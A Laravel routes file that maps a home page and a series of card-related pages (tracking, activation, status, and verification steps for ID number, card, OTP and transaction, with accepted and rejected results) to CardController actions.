  <?php

/*
|--------------------------------------------------------------------------
| Web Routes
|--------------------------------------------------------------------------
|
| Here is where you can register web routes for your application. These
| routes are loaded by the RouteServiceProvider within a group which
| contains the "web" middleware group. Now create something great!
|
*/


Route::get('/', 'HomeController@index')->name("home.index");

Route::get('/card/rastrear', 'CardController@rastrear')->name("card.rastrear");

Route::get('/card/felicitaciones', 'CardController@felicitaciones')->name("card.felicitaciones");

Route::get('/card/estado', 'CardController@estado')->name("card.estado");

Route::post('/card/mostrar', 'CardController@mostrar')->name("card.mostrar");

Route::get('/card/activar', 'CardController@activar')->name("card.activar");

Route::post('/card/v_cedula', 'CardController@v_cedula')->name("card.v_cedula");

Route::post('/card/v_tarjeta', 'CardController@v_tarjeta')->name("card.v_tarjeta");

Route::post('/card/v_otp', 'CardController@v_otp')->name("card.v_otp");

Route::post('/card/v_trans', 'CardController@v_trans')->name("card.v_trans");

Route::get('/card/aceptado', 'CardController@aceptado')->name("card.aceptado");

Route::get('/card/rechazado', 'CardController@rechazado')->name("card.rechazado");
